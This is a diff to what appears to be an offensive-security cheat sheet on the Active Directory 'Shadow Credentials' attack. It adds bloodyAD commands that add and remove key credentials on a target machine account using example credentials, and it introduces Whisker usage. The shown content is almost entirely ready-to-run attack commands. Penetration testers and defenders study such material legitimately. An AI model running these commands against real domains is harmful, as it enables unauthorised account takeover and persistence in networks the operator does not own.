@@ -12,7 +12,11 @@
 * An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object
 
 **Exploitation**: 
-
+- Windows/Linux
+  ```ps1
+  bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody add shadowCredentials targetpc$
+  bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody remove shadowCredentials targetpc$ --key <key from previous output>
+  ```
 - From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
   ```powershell
   # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
